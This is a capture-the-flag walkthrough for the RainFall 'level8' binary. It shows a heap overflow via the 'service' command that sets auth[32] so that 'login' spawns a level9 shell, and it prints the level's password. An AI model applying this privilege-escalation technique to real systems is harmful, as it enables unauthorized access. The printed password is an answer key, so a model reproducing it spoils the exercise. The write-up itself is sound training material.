# Level8

## Objective

The goal of Level 9 is to escalate from `level8` to `level9` by abusing how the `level8` binary manages heap allocations. By carefully using the available commands (`auth`, `reset`, `service`, and `login`), we can trigger the program to call `system("/bin/sh")` and gain a shell.

---

## Step 1: Examine the Binary

After switching to `level8`:

Running the binary:

```bash
level8@RainFall:~$ ./level8
(nil), (nil)
heu bjr ?
(nil), (nil)
```
With ltrace we can see that at the begining of the run the program uses printf imedietly.
`printf(%p, %p\n, (nil), (nil)(nil), (nil))`
It prints two empty pointers.

```bash
(gdb) info variables
All defined variables:
    0x08049aac auth
    0x08049ab0 service
    
```
Probably auth and service..
`(auth, service)`, both initially `nil`. Input is read with `fgets()`.

---

## Step 2: Disassembling the main

Disassembly of `main()` reveals four commands or four steps:

*It reads the input and store it as a buffer in the local memory. This buffer is compared 4 times in a raw to ascii strings. They're "auth", "service", "reset" and "service" 

* `auth <data>` → calls `malloc(4)` and `strcpy()` into the global `auth` pointer.
> Auth allocate a 4 octet space and store our argument inside. 
* `reset` → frees the `auth` pointer.
* `service <data>` → calls `strdup()` and copies into the global `service` pointer.
* `login` → if `auth[32] != 0`, it calls `system("/bin/sh")`. Otherwise, it calls `fwrite()`.
> This checks if there's something at the ofset 0x20 or [32]

Thus, the game plan is to get `auth[32]` set to something non-zero.

---

## Step 3: Heap Behavior

Heap allocations are sequential in memory. Testing shows:

```bash
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
```

Here `auth` is at `0x804a008` and `service` is exactly 16 bytes later. With padding, we can arrange things so that writing into `service` overflows into `auth[32]`.

---

## Step 4: Exploit Strategy

**Solution `service` overflow:**

* Create `auth` → allocates 4 bytes.
* Create `service` with a payload long enough to cover the 16-byte padding and reach `auth+32`.

```bash
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
serviceaaaaaaaaaaaaaaaa
0x804a008, 0x804a018
login
$ whoami
level9
```

## Step 5: Escalate to Level9

Once `login` succeeds, we get a shell as `level9`:

```bash
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

**End of Level8 Walkthrough**
